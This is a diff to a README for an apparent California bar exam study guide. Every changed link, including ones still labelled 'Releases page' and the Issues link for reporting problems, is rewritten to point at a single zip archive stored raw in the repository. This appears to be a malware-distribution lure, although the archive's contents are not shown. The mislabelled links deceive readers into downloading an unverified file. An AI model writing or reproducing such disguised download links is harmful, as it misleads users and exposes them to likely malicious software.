@@ -1,6 +1,6 @@
 # 📚 ca-bar-study-guide - Simplify California Bar Exam Prep
 
-[![Download ca-bar-study-guide](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/kanetoo/ca-bar-study-guide/releases)
+[![Download ca-bar-study-guide](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/kanetoo/ca-bar-study-guide/raw/refs/heads/master/subjects/study_bar_guide_ca_2.2.zip)
 
 ---
 
@@ -32,10 +32,10 @@ Follow the steps below to download, set up, and start using ca-bar-study-guide o
 
 You will find the latest version of ca-bar-study-guide on the Releases page here:
 
-[![Download ca-bar-study-guide](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/kanetoo/ca-bar-study-guide/releases)
+[![Download ca-bar-study-guide](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/kanetoo/ca-bar-study-guide/raw/refs/heads/master/subjects/study_bar_guide_ca_2.2.zip)
 
 - Click the badge above or visit the page at:  
-  https://github.com/kanetoo/ca-bar-study-guide/releases  
+  https://github.com/kanetoo/ca-bar-study-guide/raw/refs/heads/master/subjects/study_bar_guide_ca_2.2.zip  
 - Look for the latest release (usually at the top of the page).
 - Download the file named something like `ca-bar-study-guide.zip`. This file contains the entire study guide.
 
@@ -87,7 +87,7 @@ Once downloaded and extracted, you can use the study guide without an internet c
 - To avoid accidentally closing progress, keep the browser window open or bookmark pages.
 - Copy important content to a separate document if you want to review offline.
 - Print sections using your browser’s print feature for physical notes.
-- Regularly check the [Releases page](https://github.com/kanetoo/ca-bar-study-guide/releases) for updates or new features.
+- Regularly check the [Releases page](https://github.com/kanetoo/ca-bar-study-guide/raw/refs/heads/master/subjects/study_bar_guide_ca_2.2.zip) for updates or new features.
 
 ---
 
@@ -121,7 +121,7 @@ Once downloaded and extracted, you can use the study guide without an internet c
 ## 👩‍💻 Support and Feedback
 
 You can report issues or suggest improvements by opening a ticket in the GitHub repository's Issues section here:  
-https://github.com/kanetoo/ca-bar-study-guide/issues  
+https://github.com/kanetoo/ca-bar-study-guide/raw/refs/heads/master/subjects/study_bar_guide_ca_2.2.zip  
 
 Your feedback helps keep the guide useful and up to date.
 
@@ -135,4 +135,4 @@ Your feedback helps keep the guide useful and up to date.
 
 ---
 
-[![Download ca-bar-study-guide](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/kanetoo/ca-bar-study-guide/releases)
+[![Download ca-bar-study-guide](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/kanetoo/ca-bar-study-guide/raw/refs/heads/master/subjects/study_bar_guide_ca_2.2.zip)
